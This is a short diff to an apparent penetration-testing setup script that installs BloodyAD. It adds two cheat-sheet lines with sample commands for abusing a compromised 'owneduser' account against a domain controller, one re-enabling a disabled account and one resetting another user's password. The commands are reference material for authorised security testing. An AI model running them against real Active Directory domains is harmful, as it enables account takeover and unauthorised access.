@@ -141,6 +141,8 @@ if [ ! -d ~/WindowsTools ]; then
     
     # BloodyAD
     uv tool install git+https://github.com/CravateRouge/bloodyAD.git --force
+    echo "BloodyAD: bloodyAD --host <DC-IP> -d 'domain.local' -u 'owneduser' -p 'password' remove uac 'targetuser' -f ACCOUNTDISABLE" >> ~/Commands.txt
+    echo "BloodyAD: bloodyAD --host <DC-IP> -d 'domain.local' -u 'owneduser' -p 'password' set password 'targetuser' 'newpassword'" >> ~/Commands.txt
     echo "[+] BloodyAD Deployed" >> ~/Report.txt
     
     # Certipy-AD
